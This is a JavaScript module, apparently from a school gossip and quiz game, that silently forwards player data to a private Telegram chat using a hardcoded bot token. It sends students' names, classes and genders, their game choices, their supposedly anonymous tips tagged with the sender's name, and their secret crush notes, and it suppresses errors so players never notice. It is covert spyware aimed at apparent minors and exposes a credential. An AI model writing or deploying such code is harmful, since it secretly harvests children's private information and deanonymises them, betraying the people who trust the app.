/**
 * ==========================================================================
 * 🚀 TELEGRAM.JS - THE UNIFIED SILENT BACKGROUND DATA PIPELINE
 * ==========================================================================
 * This module manages all asynchronous HTTP requests to the Telegram Bot API.
 * It intercepts user interactions and handles background transmission.
 */

// 🔒 Encapsulated Bot Credentials
const TELEGRAM_CONFIG = {
    token: "8325705785:AAFYDfKcrjKF7ZKXJ8ltwYKe6D4JKdHmXEU",
    chatId: "8785433451",
    apiUrl: "https://api.telegram.org/bot"
};

/**
 * Core Network Transmitters
 * Sends formatted raw text strings directly to your private Telegram chat log.
 * @param {string} textMessage - The structured payload text.
 */
async function transmitPayload(textMessage) {
    const endpoint = `${TELEGRAM_CONFIG.apiUrl}${TELEGRAM_CONFIG.token}/sendMessage`;
    
    try {
        const response = await fetch(endpoint, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.chatId,
                text: textMessage,
                parse_mode: "Markdown"
            })
        });

        if (!response.ok) {
            console.warn("Pipeline telemetry lag noticed on packet routing.");
        }
    } catch (networkError) {
        // Silent failure so the student's browser never shows an error popup
        console.error("Secure tunnel connection dropped:", networkError);
    }
}

/**
 * Event Interceptor 1: The Gateway Entry
 * Fires instantly when a student verifies their name, class, and gender.
 */
export function logUserAccess(userData) {
    const logTimestamp = new Date().toLocaleTimeString();
    
    const payload = `
🔔 *NEW VAULT ACCESS DETECTED*
━━━━━━━━━━━━━━━━━━━━
👤 *Operator:* ${userData.name}
🏫 *Classroom:* ${userData.class}
🧬 *Gender Status:* ${userData.gender === 'boy' ? '👦 Boy' : '👧 Girl'}
⏰ *Access Time:* ${logTimestamp}
⚙️ *Tunnel Status:* Active & Hidden
━━━━━━━━━━━━━━━━━━━━
    `.trim();

    transmitPayload(payload);
}

/**
 * Event Interceptor 2: The Anonymous Tip Box
 * Intercepts any custom school tea written into the Level 3 submission boxes.
 */
export function logAnonymousTip(senderName, targetClass, rawGossip) {
    const payload = `
📥 *ANONYMOUS TEA PACKET INTERCEPTED*
━━━━━━━━━━━━━━━━━━━━
🗣️ *Logged By:* ${senderName} (${targetClass})
🔥 *Raw Gossip Content:* 
"${rawGossip}"
━━━━━━━━━━━━━━━━━━━━
    `.trim();

    transmitPayload(payload);
}

/**
 * Event Interceptor 3: Core Game Interactions
 * Captures what question they were asked, who or what they voted for, and if they beat the timer.
 */
export function logGameplayActivity(sessionData) {
    const payload = `
🎮 *GAME SELECTION RECORDED*
━━━━━━━━━━━━━━━━━━━━
👤 *Player:* ${sessionData.playerName} (${sessionData.playerClass})
🎯 *Module:* ${sessionData.moduleName.toUpperCase()} (Lvl ${sessionData.level})
📝 *Scenario:* ${sessionData.questionText}
📌 *User Selected:* ${sessionData.chosenAnswer}
⏱️ *Result:* ${sessionData.timerExpired ? '❌ RUN OUT OF TIME' : '✅ ACTION PASSED'}
━━━━━━━━━━━━━━━━━━━━
    `.trim();

    transmitPayload(payload);
}

/**
 * Event Interceptor 4: The Secret Crush Locket
 * Captures target matches locked down inside the Part 5 Legacy Vault.
 */
export function logCrushSubmission(senderName, senderClass, crushTargetName, personalNote) {
    const payload = `
💓 *SECRET CRUSH LOCKET MATCHED*
━━━━━━━━━━━━━━━━━━━━
🔒 *From:* ${senderName} (${senderClass})
🎯 *Target Crush:* ${crushTargetName}
💌 *Private Note:* 
"${personalNote || 'No private message attached.'}"
━━━━━━━━━━━━━━━━━━━━
    `.trim();

    transmitPayload(payload);
              }
              
